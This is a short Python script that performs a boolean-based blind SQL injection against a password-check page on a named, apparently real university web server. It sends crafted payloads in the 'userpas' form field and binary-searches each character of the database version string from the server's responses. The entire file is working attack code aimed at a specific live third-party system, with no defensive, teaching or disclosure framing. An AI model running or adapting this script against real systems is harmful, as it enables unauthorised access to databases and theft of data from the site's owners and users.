import requests

def main():
    query = "select version()"
    result = ""
    for i in range(1, 100):
        left, right = 0, 255
        mid = (left + right) // 2
        while left < right:
            payload = f"'||ascii(mid(({query}),{i},1))<{mid}-- -"
            # print(payload)
            d = {
                'original': 'data',
                'userpas': payload
            }
            resp = requests.post("http://www.gpsarc.ncu.edu.tw/gpsarc/php/check_userpas.php", data=d)
            if "Invalid password" not in resp.text:
                right = mid
            else:
                left = mid + 1
            mid = (left + right) // 2
        mid -= 1
        if mid == 0:
            print(result)
            break
        else:
            print(mid, chr(mid))
            result += chr(mid)
            print(result)

if __name__ == '__main__':
    main()
